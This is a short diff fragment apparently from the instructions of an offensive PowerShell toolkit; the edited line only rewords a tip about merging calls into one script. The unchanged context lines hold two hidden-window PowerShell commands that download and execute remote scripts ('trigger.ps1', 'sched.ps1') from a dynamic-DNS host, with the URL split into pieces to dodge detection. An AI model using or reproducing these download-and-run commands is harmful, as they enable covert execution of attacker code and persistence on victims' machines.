@@ -66,7 +66,7 @@ In this case you are going to run 2 Invokes:
 powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/trigger.ps1')
 powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/sched.ps1')
 
-You can make only one call by creating another .ps1
+You can make it run with only one Invoke by creating another .ps1.
 
 These scripts are going to be in this repository: 
 ----------------------------------------
